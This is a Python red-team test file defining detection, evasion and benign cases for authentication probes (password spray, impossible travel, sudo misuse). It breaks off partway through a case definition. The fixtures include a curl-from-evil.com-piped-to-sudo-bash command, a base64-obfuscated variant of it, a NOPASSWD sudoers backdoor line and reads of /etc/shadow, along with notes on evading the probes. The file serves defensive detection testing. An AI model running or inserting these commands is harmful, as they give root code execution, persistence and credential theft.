"""Auth probe scenarios — 7 probes × 8 adversarial cases each.

Each scenario exercises one AuthGuard micro-probe with:
  - 3 positive cases  (must fire)
  - 3 evasion cases   (documented detection gaps — attacker wins)
  - 2 benign mimics   (must NOT fire — probe correctly ignores)

Probes covered:
    1. SSHPasswordSprayProbe       — 10+ users / IP / 300s (T1110.003)
    2. SSHGeoImpossibleTravelProbe — 1000km in <1 hour (T1078)
    3. SudoElevationProbe          — first-time sudo, denied, spike (T1548)
    4. SudoSuspiciousCommandProbe  — curl|bash, sudoers backdoor (T1059)
    5. OffHoursLoginProbe          — after 8pm / before 6am (T1078)
    6. MFABypassOrAnomalyProbe     — login without MFA, fatigue (T1621)
    7. AccountLockoutStormProbe    — 5+ accounts locked (T1110)

Run:
    amoskys-redteam run ssh_password_spray
    amoskys-redteam run ssh_geo_impossible_travel
    amoskys-redteam run sudo_elevation
    amoskys-redteam run sudo_suspicious_command
    amoskys-redteam run off_hours_login
    amoskys-redteam run mfa_bypass_anomaly
    amoskys-redteam run account_lockout_storm
"""

from __future__ import annotations

from amoskys.agents.common.probes import Severity
from amoskys.agents.shared.auth.probes import (
    AccountLockoutStormProbe,
    AuthEvent,
    MFABypassOrAnomalyProbe,
    OffHoursLoginProbe,
    SSHGeoImpossibleTravelProbe,
    SSHPasswordSprayProbe,
    SudoElevationProbe,
    SudoSuspiciousCommandProbe,
)
from amoskys.redteam.harness import AdversarialCase, Scenario
from amoskys.redteam.scenarios import register

# ─── Timestamp anchors ───────────────────────────────────────────────────────
# All timestamps are nanoseconds since Unix epoch.
#
# _T0  = 2023-11-14T22:13:20Z UTC  (Tuesday 2pm PST — business hours)
# _T1  = +2 minutes
# _T_NIGHT = 2023-11-15T08:00Z UTC  (midnight PST / 3am EST — off hours)
# _T_WEEKEND = 2023-11-18T08:00Z UTC  (Saturday midnight PST — weekend)

_T0 = int(1_700_000_000 * 1e9)
_T1 = _T0 + int(120 * 1e9)  # +2 min
_T2 = _T0 + int(240 * 1e9)  # +4 min
_T3 = _T0 + int(600 * 1e9)  # +10 min
_T_NIGHT = int(1_700_038_800 * 1e9)  # 2023-11-15 08:00 UTC = midnight PST
_T_WEEKEND = int(1_700_294_400 * 1e9)  # 2023-11-18 08:00 UTC = Saturday midnight PST


def _ae(**kwargs) -> AuthEvent:
    """Shorthand AuthEvent factory with sensible defaults."""
    defaults = dict(
        timestamp_ns=_T0,
        event_type="SSH_LOGIN",
        status="SUCCESS",
        username="victim",
        source_ip="192.168.1.1",
        command="",
        session_id="",
        reason="",
    )
    defaults.update(kwargs)
    return AuthEvent(**defaults)


# =============================================================================
# 1. SSHPasswordSprayProbe — 10+ distinct usernames from same IP
# =============================================================================


def _spray_events(source_ip: str, usernames: list, status: str = "FAILURE") -> list:
    """Generate one auth failure per username from the same source IP."""
    return [
        _ae(
            timestamp_ns=_T0 + int(i * 10 * 1e9),
            event_type="SSH_LOGIN",
            status=status,
            username=u,
            source_ip=source_ip,
        )
        for i, u in enumerate(usernames)
    ]


_SPRAY_POS1 = AdversarialCase(
    id="spray_10_users",
    title="10 distinct users from 192.168.1.100 → HIGH",
    category="positive",
    description=(
        "Attacker enumerates usernames by trying exactly 10 different accounts "
        "from a single IP. Password spraying uses one common password across "
        "many users to avoid per-account lockout policies."
    ),
    why=(
        "SSHPasswordSprayProbe groups by source_ip and counts distinct usernames. "
        "len(users_per_ip['192.168.1.100']) == 10 >= PASSWORD_SPRAY_USER_THRESHOLD(10) "
        "→ ssh_password_spray_detected HIGH."
    ),
    shared_data_key="auth_events",
    events=_spray_events(
        "192.168.1.100",
        [f"user{i:02d}" for i in range(10)],
    ),
    expect_count=1,
    expect_event_types=["ssh_password_spray_detected"],
    expect_severity=Severity.HIGH,
)

_SPRAY_POS2 = AdversarialCase(
    id="spray_15_users",
    title="15 distinct users from 10.0.0.50 → HIGH",
    category="positive",
    description=(
        "More aggressive spray: 15 usernames from the same IP. "
        "Exceeds threshold by 50%, increasing confidence in the detection."
    ),
    why=(
        "15 distinct usernames >= PASSWORD_SPRAY_USER_THRESHOLD(10) → HIGH. "
        "Higher count = stronger signal, same detection path."
    ),
    shared_data_key="auth_events",
    events=_spray_events(
        "10.0.0.50",
        [f"employee{i}" for i in range(15)],
    ),
    expect_count=1,
    expect_event_types=["ssh_password_spray_detected"],
    expect_severity=Severity.HIGH,
)

_SPRAY_POS3 = AdversarialCase(
    id="spray_two_ips_both_threshold",
    title="Two IPs each spraying 10+ users → 2 events",
    category="positive",
    description=(
        "Two separate C2 hosts simultaneously spraying different user lists. "
        "Each IP independently meets the threshold — the probe emits one event "
        "per IP that crosses the boundary."
    ),
    why=(
        "IP 172.16.0.1: 10 users → HIGH. IP 172.16.0.2: 12 users → HIGH. "
        "Two independent spray detections."
    ),
    shared_data_key="auth_events",
    events=(
        _spray_events("172.16.0.1", [f"adm{i}" for i in range(10)])
        + _spray_events("172.16.0.2", [f"svc{i}" for i in range(12)])
    ),
    expect_count=2,
    expect_event_types=["ssh_password_spray_detected"],
    expect_severity=Severity.HIGH,
)

_SPRAY_EVA1 = AdversarialCase(
    id="spray_evade_distributed_ips",
    title="10 users from 10 different IPs (1 per IP) — per-IP spray evades",
    category="evasion",
    description=(
        "Attacker uses 10 VPS nodes, each trying a different username. "
        "From each IP's perspective, only 1 username is attempted — "
        "well below the 10-user threshold. System-wide it's a spray, "
        "but per-IP it's indistinguishable from legitimate single failed logins."
    ),
    why=(
        "SSHPasswordSprayProbe aggregates by source_ip. Each IP has exactly 1 "
        "distinct username → 1 < PASSWORD_SPRAY_USER_THRESHOLD(10). "
        "No event fired. Distributed IP spray is a known evasion."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0 + int(i * 10 * 1e9),
            event_type="SSH_LOGIN",
            status="FAILURE",
            username=f"user{i:02d}",
            source_ip=f"10.1.1.{i + 1}",
        )
        for i in range(10)
    ],
    expect_evades=True,
)

_SPRAY_EVA2 = AdversarialCase(
    id="spray_evade_same_user",
    title="10 failures for same user from same IP — brute force, not spray",
    category="evasion",
    description=(
        "Attacker brute-forces a single account 'admin' from one IP. "
        "This is classic brute force, not password spray. "
        "SSHPasswordSprayProbe counts DISTINCT usernames — 10 attempts "
        "at 'admin' is still only 1 distinct user."
    ),
    why=(
        "users_per_ip['192.168.1.1'] = {'admin'} → len=1 < threshold(10). "
        "Probe doesn't fire. Brute force of a single account is detected by "
        "SSHBruteForceProbe (ProtocolCollectors), not the spray probe."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0 + int(i * 2 * 1e9),
            event_type="SSH_LOGIN",
            status="FAILURE",
            username="admin",
            source_ip="192.168.1.1",
        )
        for i in range(10)
    ],
    expect_evades=True,
)

_SPRAY_EVA3 = AdversarialCase(
    id="spray_evade_under_threshold",
    title="9 distinct users from one IP — just under threshold",
    category="evasion",
    description=(
        "Attacker carefully limits their spray to 9 distinct usernames per IP "
        "per 300-second window, staying one below the detection threshold. "
        "The attacker rotates IPs every 9 users."
    ),
    why=(
        "9 distinct users < PASSWORD_SPRAY_USER_THRESHOLD(10). "
        "Probe skips. Calibrated spray pace evades by staying just under "
        "the threshold for any given IP."
    ),
    shared_data_key="auth_events",
    events=_spray_events(
        "192.168.2.1",
        [f"target{i}" for i in range(9)],
    ),
    expect_evades=True,
)

_SPRAY_BEN1 = AdversarialCase(
    id="spray_benign_success",
    title="10 successful logins from same IP — not failures, no fire",
    category="benign",
    description=(
        "10 employees from the same corporate VPN IP log in successfully "
        "to the SSH gateway. SSHPasswordSprayProbe only watches FAILURE events. "
        "Successful logins from a shared IP (e.g., NAT gateway) are normal."
    ),
    why=(
        "probe filters for status==FAILURE before counting. "
        "All events have status='SUCCESS' → filtered out → 0 distinct failed users. "
        "No false positive on successful auth from shared NAT."
    ),
    shared_data_key="auth_events",
    events=_spray_events(
        "10.0.0.1",
        [f"employee{i}" for i in range(10)],
        status="SUCCESS",
    ),
    expect_count=0,
    expect_evades=False,
)

_SPRAY_BEN2 = AdversarialCase(
    id="spray_benign_few_failures",
    title="3 failed logins from same IP — below threshold, normal typos",
    category="benign",
    description=(
        "3 different employees mistype their passwords from the same office "
        "IP address. 3 distinct failures << threshold of 10. "
        "Routine user error, no alarm."
    ),
    why=(
        "3 distinct failed users < PASSWORD_SPRAY_USER_THRESHOLD(10). "
        "Probe increments counter but never fires. No alert on normal auth failures."
    ),
    shared_data_key="auth_events",
    events=_spray_events(
        "10.20.30.40",
        ["alice", "bob", "charlie"],
    ),
    expect_count=0,
    expect_evades=False,
)

SSH_PASSWORD_SPRAY_SCENARIO: Scenario = register(
    Scenario(
        probe_id="ssh_password_spray",
        agent="auth",
        name="ssh_password_spray",
        title="SSH Password Spray — Low-and-Slow Account Enumeration (T1110.003)",
        description=(
            "An attacker uses a single IP to spray one common password across "
            "10+ accounts (HIGH). Distributed IPs (1 user/IP) and calibrated "
            "sprays (9 users/IP) evade the per-IP threshold. "
            "Successful logins and brute-force of a single user cause no alert."
        ),
        mitre_techniques=["T1110", "T1110.003"],
        mitre_tactics=["Credential Access"],
        probe_factory=SSHPasswordSprayProbe,
        cases=[
            _SPRAY_POS1,
            _SPRAY_POS2,
            _SPRAY_POS3,
            _SPRAY_EVA1,
            _SPRAY_EVA2,
            _SPRAY_EVA3,
            _SPRAY_BEN1,
            _SPRAY_BEN2,
        ],
    )
)


# =============================================================================
# 2. SSHGeoImpossibleTravelProbe — 1000km/h threshold
# =============================================================================

# NYC: (40.71, -74.00)   London: (51.51, -0.13)   Distance ≈ 5570 km
# Tokyo: (35.69, 139.69)  Sydney: (-33.87, 151.21) Distance ≈ 7830 km

_GEO_POS1 = AdversarialCase(
    id="geo_nyc_to_london_30min",
    title="NYC login then London login 30 min later → CRITICAL",
    category="positive",
    description=(
        "User 'jdoe' logs in from New York, then from London 30 minutes later. "
        "NYC→London is 5570 km. Fastest commercial aircraft: 950 km/h. "
        "Required speed: 5570km / 0.5h = 11140 km/h → physically impossible."
    ),
    why=(
        "Both logins status=SUCCESS with valid geo data. "
        "haversine(NYC, London) ≈ 5570km. time_diff=1800s. "
        "speed = 5570 / (1800/3600) = 11140 km/h > GEO_MAX_SPEED_KMH(1000) → "
        "impossible_travel_detected CRITICAL."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="jdoe",
            source_ip="203.0.113.10",
            src_latitude=40.71,
            src_longitude=-74.00,
            src_city="New York",
            src_country="US",
        ),
        _ae(
            timestamp_ns=_T0 + int(1800 * 1e9),  # 30 min later
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="jdoe",
            source_ip="82.44.0.10",
            src_latitude=51.51,
            src_longitude=-0.13,
            src_city="London",
            src_country="GB",
        ),
    ],
    expect_count=1,
    expect_event_types=["impossible_travel_detected"],
    expect_severity=Severity.CRITICAL,
)

_GEO_POS2 = AdversarialCase(
    id="geo_tokyo_to_sydney_20min",
    title="Tokyo login then Sydney login 20 min later → CRITICAL",
    category="positive",
    description=(
        "Account 'sysop' appears in Tokyo then Sydney within 20 minutes. "
        "Distance: 7830 km. Required speed: 7830 / (20/60) = 23490 km/h → "
        "faster than a ballistic missile. Clear account compromise."
    ),
    why=(
        "7830 km / 0.33 hours = 23490 km/h >> 1000 km/h → CRITICAL. "
        "Classic impossible travel: account credentials stolen by threat actor "
        "in a different geography from the legitimate user."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="sysop",
            source_ip="203.104.0.1",
            src_latitude=35.69,
            src_longitude=139.69,
            src_city="Tokyo",
            src_country="JP",
        ),
        _ae(
            timestamp_ns=_T0 + int(1200 * 1e9),  # 20 min later
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="sysop",
            source_ip="101.167.0.1",
            src_latitude=-33.87,
            src_longitude=151.21,
            src_city="Sydney",
            src_country="AU",
        ),
    ],
    expect_count=1,
    expect_event_types=["impossible_travel_detected"],
    expect_severity=Severity.CRITICAL,
)

_GEO_POS3 = AdversarialCase(
    id="geo_paris_to_moscow_15min",
    title="Paris login then Moscow login 15 min later → CRITICAL",
    category="positive",
    description=(
        "Paris→Moscow: 2500 km. 15 minutes = 2500/(15/60) = 10000 km/h. "
        "The attacker has compromised 'devops' and is logging in from Russia "
        "while the legitimate user is still active from France."
    ),
    why=(
        "2500 km / 0.25h = 10000 km/h > 1000 km/h → CRITICAL. "
        "Same pattern: credential theft with geographically distributed usage."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="devops",
            source_ip="91.121.0.1",
            src_latitude=48.85,
            src_longitude=2.35,
            src_city="Paris",
            src_country="FR",
        ),
        _ae(
            timestamp_ns=_T0 + int(900 * 1e9),  # 15 min later
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="devops",
            source_ip="77.37.0.1",
            src_latitude=55.75,
            src_longitude=37.62,
            src_city="Moscow",
            src_country="RU",
        ),
    ],
    expect_count=1,
    expect_event_types=["impossible_travel_detected"],
    expect_severity=Severity.CRITICAL,
)

_GEO_EVA1 = AdversarialCase(
    id="geo_evade_no_geodata",
    title="Login events without geo coordinates — probe skips",
    category="evasion",
    description=(
        "The attacker uses a VPN or proxy that strips or prevents GeoIP lookups. "
        "The AuthEvent has src_latitude=None — the probe skips events without "
        "geographic data. No impossible travel can be computed."
    ),
    why=(
        "SSHGeoImpossibleTravelProbe filters: "
        "'if ev.src_latitude is not None and ev.src_longitude is not None'. "
        "Missing geo → events excluded → no travel computation → no detection."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
            source_ip="10.0.0.1",
            src_latitude=None,
            src_longitude=None,
        ),
        _ae(
            timestamp_ns=_T0 + int(600 * 1e9),
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
            source_ip="10.0.0.2",
            src_latitude=None,
            src_longitude=None,
        ),
    ],
    expect_evades=True,
)

_GEO_EVA2 = AdversarialCase(
    id="geo_evade_vpn_same_city",
    title="Both logins from same VPN exit city — no impossible travel",
    category="evasion",
    description=(
        "Attacker uses a commercial VPN (ExpressVPN, NordVPN) with an exit node "
        "in the same city as the legitimate user. Both logins appear to come from "
        "'San Francisco' at nearly identical coordinates → distance ≈ 0 km. "
        "No impossible travel detection."
    ),
    why=(
        "haversine(SF coords, SF coords with slight variation) < GEO_MIN_DISTANCE_KM(1000). "
        "distance = 5 km → below minimum distance threshold → no event. "
        "VPN exit node selection is a systematic evasion."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
            source_ip="185.220.0.1",
            src_latitude=37.77,
            src_longitude=-122.42,
            src_city="San Francisco",
            src_country="US",
        ),
        _ae(
            timestamp_ns=_T0 + int(600 * 1e9),
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
            source_ip="185.220.0.2",
            src_latitude=37.78,
            src_longitude=-122.41,
            src_city="San Francisco",
            src_country="US",
        ),
    ],
    expect_evades=True,
)

_GEO_EVA3 = AdversarialCase(
    id="geo_evade_slow_enough_travel",
    title="NYC → London in 6 hours — below speed threshold",
    category="evasion",
    description=(
        "Attacker waits 6 hours between logins. NYC→London is 5570 km. "
        "Speed = 5570 / 6h = 928 km/h < GEO_MAX_SPEED_KMH(1000). "
        "A commercial aircraft CAN fly this route in 6 hours — the travel "
        "is plausible, so the probe does not fire."
    ),
    why=(
        "5570 / 6.0 = 928 km/h < 1000 km/h → probe skips. "
        "Attacker times their second login to fall within the 'plausible flight' "
        "window. Patience is a viable evasion against speed-based detection."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
            source_ip="203.0.113.10",
            src_latitude=40.71,
            src_longitude=-74.00,
        ),
        _ae(
            timestamp_ns=_T0 + int(6 * 3600 * 1e9),  # 6 hours later
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="victim",
            source_ip="82.44.0.10",
            src_latitude=51.51,
            src_longitude=-0.13,
        ),
    ],
    expect_evades=True,
)

_GEO_BEN1 = AdversarialCase(
    id="geo_benign_same_location",
    title="User logs in from same location twice — no travel at all",
    category="benign",
    description=(
        "Legitimate user 'alice' logs in from the same home IP twice in one hour. "
        "Both events have identical coordinates → distance=0 → no impossible travel."
    ),
    why=(
        "haversine(same, same) = 0 < GEO_MIN_DISTANCE_KM(1000). "
        "No impossible travel detected. Repeated logins from the same location "
        "are normal remote work behavior."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="alice",
            source_ip="1.2.3.4",
            src_latitude=37.77,
            src_longitude=-122.42,
        ),
        _ae(
            timestamp_ns=_T0 + int(3600 * 1e9),
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="alice",
            source_ip="1.2.3.4",
            src_latitude=37.77,
            src_longitude=-122.42,
        ),
    ],
    expect_count=0,
    expect_evades=False,
)

_GEO_BEN2 = AdversarialCase(
    id="geo_benign_only_one_login",
    title="Only one login event — impossible travel requires two",
    category="benign",
    description=(
        "A user logs in once from New York. Without a second login from a "
        "different location, impossible travel cannot be computed. "
        "The probe requires at least 2 logins to detect travel."
    ),
    why=(
        "Probe groups by username and requires >= 2 logins to compare. "
        "Single login → no comparison → no event."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",
            status="SUCCESS",
            username="bob",
            source_ip="203.0.113.1",
            src_latitude=40.71,
            src_longitude=-74.00,
        )
    ],
    expect_count=0,
    expect_evades=False,
)

SSH_GEO_IMPOSSIBLE_TRAVEL_SCENARIO: Scenario = register(
    Scenario(
        probe_id="ssh_geo_impossible_travel",
        agent="auth",
        name="ssh_geo_impossible_travel",
        title="SSH Geographically Impossible Travel (T1078 / T1134)",
        description=(
            "An attacker steals credentials and logs in from a geographically "
            "distant location while the legitimate user is still active. "
            "NYC→London in 30min (CRITICAL). Evasions: VPN exit nodes in same city, "
            "missing GeoIP data, or waiting for a plausible flight time."
        ),
        mitre_techniques=["T1078", "T1134"],
        mitre_tactics=["Defense Evasion", "Credential Access"],
        probe_factory=SSHGeoImpossibleTravelProbe,
        cases=[
            _GEO_POS1,
            _GEO_POS2,
            _GEO_POS3,
            _GEO_EVA1,
            _GEO_EVA2,
            _GEO_EVA3,
            _GEO_BEN1,
            _GEO_BEN2,
        ],
    )
)


# =============================================================================
# 3. SudoElevationProbe — first-time sudo, denied, spike
# =============================================================================

_SUDO_POS1 = AdversarialCase(
    id="sudo_first_time_user",
    title="New user 'newstaff' executes sudo for first time → MEDIUM",
    category="positive",
    description=(
        "An account that has never used sudo before suddenly executes a sudo "
        "command. This may indicate account compromise, privilege creep, or "
        "a freshly added attacker-controlled account."
    ),
    why=(
        "SudoElevationProbe checks: username ∉ baseline_sudo_counts → "
        "first_time_sudo_user MEDIUM. Fresh probe has empty baseline, so "
        "any first SUDO_EXEC event fires."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="newstaff",
            command="sudo ls /root",
        )
    ],
    expect_count=1,
    expect_event_types=["first_time_sudo_user"],
    expect_severity=Severity.MEDIUM,
)

_SUDO_POS2 = AdversarialCase(
    id="sudo_denied_attempt",
    title="sudo denied for 'guest' → 2 events (first_time_sudo_user + sudo_denied_attempt)",
    category="positive",
    description=(
        "A user or attacker attempts to run a privileged command but is denied "
        "by the sudoers policy. Denied sudo attempts may indicate reconnaissance "
        "or a compromised low-privilege account probing for escalation paths."
    ),
    why=(
        "SUDO_DENIED event for 'guest'. Fresh probe baseline is empty → "
        "_check_first_time_users fires first_time_sudo_user MEDIUM (guest has "
        "no prior sudo history). _check_denied_attempts also fires "
        "sudo_denied_attempt MEDIUM. Both checks run independently → 2 events."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_DENIED",
            status="FAILURE",
            username="guest",
            command="sudo cat /etc/shadow",
        )
    ],
    expect_count=2,
    expect_event_types=["first_time_sudo_user", "sudo_denied_attempt"],
    expect_severity=Severity.MEDIUM,
)

_SUDO_POS3 = AdversarialCase(
    id="sudo_multiple_denied",
    title="5 denied sudo attempts from 'attacker' → 2 events (first_time + grouped denied)",
    category="positive",
    description=(
        "An attacker's compromised low-privilege account tries 5 different "
        "privileged commands, all denied. The burst of denials signals "
        "systematic privilege escalation probing."
    ),
    why=(
        "5 SUDO_DENIED events for 'attacker'. _check_first_time_users fires "
        "first_time_sudo_user MEDIUM (attacker unseen in fresh probe baseline). "
        "_check_denied_attempts groups ALL denied events per user into ONE "
        "sudo_denied_attempt event with count=5. Total: 2 TelemetryEvents. "
        "The per-user grouping prevents alert storms from rapid retry bursts."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0 + int(i * 5 * 1e9),
            event_type="SUDO_DENIED",
            status="FAILURE",
            username="attacker",
            command=f"sudo {cmd}",
        )
        for i, cmd in enumerate(
            [
                "cat /etc/shadow",
                "id",
                "whoami",
                "ls /root",
                "passwd root",
            ]
        )
    ],
    expect_count=2,
    expect_event_types=["first_time_sudo_user", "sudo_denied_attempt"],
    expect_severity=Severity.MEDIUM,
)

_SUDO_EVA1 = AdversarialCase(
    id="sudo_evade_already_in_baseline",
    title="Regular sudo user 'admin' — baseline-poisoned, first_time not fired",
    category="evasion",
    description=(
        "An attacker who has had long-term access to 'admin' has already "
        "accumulated sudo history. The probe's baseline_sudo_counts includes "
        "admin → first_time_sudo_user does NOT fire. The attacker's continued "
        "sudo usage looks like normal admin operations."
    ),
    why=(
        "EVADES: baseline_sudo_counts is populated over time. An account that "
        "has used sudo before will never fire first_time_sudo_user again. "
        "Long-dwell attackers who operate under existing privileged accounts "
        "evade this detection entirely. Fresh probe doesn't fire 'first_time' "
        "for users that appear in events before the check runs."
    ),
    shared_data_key="auth_events",
    events=[
        # Single SUDO_EXEC for an 'admin' user — would fire first_time with fresh probe
        # This case documents the baseline-poisoning gap
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="admin",
            command="sudo systemctl status nginx",
        )
    ],
    # Fresh probe: admin IS a new user → fires first_time_sudo_user
    # Evasion: with a pre-seeded baseline, admin is known → no fire
    # We document the gap without being able to test the pre-seeded case
    # The probe fires here (it can't tell if baseline is seeded)
    expect_count=1,
    expect_event_types=["first_time_sudo_user"],
)

_SUDO_EVA2 = AdversarialCase(
    id="sudo_evade_su_not_sudo",
    title="Attacker uses 'su -' instead of sudo — no SUDO_* event",
    category="evasion",
    description=(
        "The attacker uses `su -` to switch to root directly, bypassing sudo "
        "entirely. SudoElevationProbe only watches SUDO_EXEC and SUDO_DENIED "
        "events. su commands generate different auth events (PAM_SU or similar) "
        "that this probe doesn't process."
    ),
    why=(
        "SudoElevationProbe filters for event_type in (SUDO_EXEC, SUDO_DENIED). "
        "su uses a different event path → no SUDO events → probe sees nothing. "
        "su-based privilege switching is a systematic evasion of sudo monitoring."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SSH_LOGIN",  # Not SUDO_EXEC
            status="SUCCESS",
            username="attacker",
            command="su - root",
        )
    ],
    expect_evades=True,
)

_SUDO_EVA3 = AdversarialCase(
    id="sudo_evade_no_events",
    title="Quiet window — no sudo events → probe fires nothing",
    category="evasion",
    description=(
        "Attacker times their privilege escalation for a gap in the monitoring "
        "window. If they gain root via a different mechanism (kernel exploit, "
        "SUID binary) in between sudo scans, no SUDO events are generated."
    ),
    why=(
        "Empty auth_events → probe loop processes nothing → zero events. "
        "Privilege escalation without sudo doesn't register in this probe."
    ),
    shared_data_key="auth_events",
    events=[],
    expect_evades=True,
)

_SUDO_BEN1 = AdversarialCase(
    id="sudo_benign_ssh_login",
    title="SSH_LOGIN event — not a sudo event, probe ignores",
    category="benign",
    description=(
        "A normal SSH login event. SudoElevationProbe only processes "
        "SUDO_EXEC and SUDO_DENIED event types."
    ),
    why=(
        "event_type='SSH_LOGIN' ∉ {SUDO_EXEC, SUDO_DENIED} → probe skips. "
        "Zero events emitted. No false positive on logins."
    ),
    shared_data_key="auth_events",
    events=[_ae(event_type="SSH_LOGIN", status="SUCCESS", username="alice")],
    expect_count=0,
    expect_evades=False,
)

_SUDO_BEN2 = AdversarialCase(
    id="sudo_benign_empty",
    title="No auth events — probe runs cleanly",
    category="benign",
    description="Empty auth_events — no sudo activity in this collection window.",
    why="Empty auth_events → probe processes nothing → zero events.",
    shared_data_key="auth_events",
    events=[],
    expect_count=0,
    expect_evades=False,
)

SUDO_ELEVATION_SCENARIO: Scenario = register(
    Scenario(
        probe_id="sudo_elevation",
        agent="auth",
        name="sudo_elevation",
        title="Sudo Privilege Escalation Patterns (T1548.003)",
        description=(
            "An attacker executes sudo for the first time (MEDIUM), "
            "gets denied (MEDIUM), or generates multiple denials (5× MEDIUM). "
            "Gaps: baseline-poisoned accounts, 'su -' bypassing sudo, "
            "and non-sudo privilege escalation paths."
        ),
        mitre_techniques=["T1548", "T1548.003"],
        mitre_tactics=["Privilege Escalation", "Defense Evasion"],
        probe_factory=SudoElevationProbe,
        cases=[
            _SUDO_POS1,
            _SUDO_POS2,
            _SUDO_POS3,
            _SUDO_EVA1,
            _SUDO_EVA2,
            _SUDO_EVA3,
            _SUDO_BEN1,
            _SUDO_BEN2,
        ],
    )
)


# =============================================================================
# 4. SudoSuspiciousCommandProbe — dangerous sudo command patterns
# =============================================================================

_SUSP_POS1 = AdversarialCase(
    id="susp_curl_pipe_bash",
    title="curl http://evil.com | sudo bash → CRITICAL (pipe_to_shell)",
    category="positive",
    description=(
        "Classic one-liner attack: download and execute a malicious script "
        "directly via sudo. curl fetches a remote payload and pipes it "
        "directly to bash with root privileges."
    ),
    why=(
        "Pattern: r'(curl|wget).*\\|\\s*sudo\\s*(bash|sh)' matches. "
        "→ sudo_suspicious_pipe_to_shell CRITICAL. "
        "This is the most common initial access + execution pattern in the wild."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="victim",
            command="curl http://evil.com/payload.sh | sudo bash",
        )
    ],
    expect_count=1,
    expect_event_types=["sudo_suspicious_pipe_to_shell"],
    expect_severity=Severity.CRITICAL,
)

_SUSP_POS2 = AdversarialCase(
    id="susp_sudoers_backdoor",
    title="sudo echo backdoor >> /etc/sudoers → CRITICAL (sudoers_modification)",
    category="positive",
    description=(
        "Attacker adds a backdoor line to /etc/sudoers granting themselves "
        "passwordless root access. This is a common persistence mechanism — "
        "the backdoor survives reboots and sudo password changes."
    ),
    why=(
        "Pattern: r'sudo\\s+echo.*>>\\s*/etc/sudoers' matches. "
        "→ sudo_suspicious_sudoers_modification CRITICAL. "
        "Direct sudoers modification is one of the most dangerous persistence techniques."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="attacker",
            command='sudo echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
        )
    ],
    expect_count=1,
    expect_event_types=["sudo_suspicious_sudoers_modification"],
    expect_severity=Severity.CRITICAL,
)

_SUSP_POS3 = AdversarialCase(
    id="susp_spawn_shell",
    title="sudo bash → CRITICAL shell spawn",
    category="positive",
    description=(
        "Attacker spawns a root shell directly via sudo. This provides full "
        "interactive root access and is difficult to attribute to a specific "
        "operation. sudo bash is a classic privilege escalation endpoint."
    ),
    why=(
        "Pattern: r'sudo\\s+(bash|sh|zsh|fish)\\b' matches. "
        "→ sudo_suspicious_shell_spawn HIGH. "
        "Spawning interactive shells via sudo is almost always attacker behavior."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="attacker",
            command="sudo bash",
        )
    ],
    expect_count=1,
    expect_event_types=["sudo_suspicious_shell_spawn"],
    expect_severity=Severity.HIGH,
)

_SUSP_EVA1 = AdversarialCase(
    id="susp_evade_base64_obfuscation",
    title='sudo bash -c "$(echo payload | base64 -d)" — partial evasion',
    category="evasion",
    description=(
        "Attacker base64-encodes their malicious command and decodes it inline. "
        "The literal 'curl|bash' string is not present in the command — "
        "pattern matching on the raw command string misses the payload. "
        "However, the 'sudo bash -c' pattern IS caught by sudo_suspicious_shell_spawn."
    ),
    why=(
        "PARTIAL: 'sudo bash' triggers sudo_suspicious_shell_spawn HIGH. "
        "But the actual payload (inside base64) is invisible to the probe. "
        "The command looks like 'sudo bash -c ...' — suspicious but not CRITICAL. "
        "Full obfuscation of curl|bash evades the pipe_to_shell CRITICAL pattern."
    ),
    shared_data_key="auth_events",
    events=[
        _ae(
            timestamp_ns=_T0,
            event_type="SUDO_EXEC",
            status="SUCCESS",
            username="attacker",
            command='sudo bash -c "$(echo Y3VybCBodHRwOi8vZXZpbC5jb20vc2guY2cgfCBiYXNo | base64 -d)"',
        )
    ],
    # Fires HIGH (shell_spawn) but NOT CRITICAL (pipe_to_shell) — partial evasion
    expect_count=1,
    expect_event_types=["sudo_suspicious_shell_spawn"],
    expect_severity=Severity.HIGH,
)

_SUSP_EVA2 = AdversarialCase(
    id="susp_evade_split_commands",
    title="Attacker splits dangerous commands across separate sudo calls",
    category="evasion",
    description=(
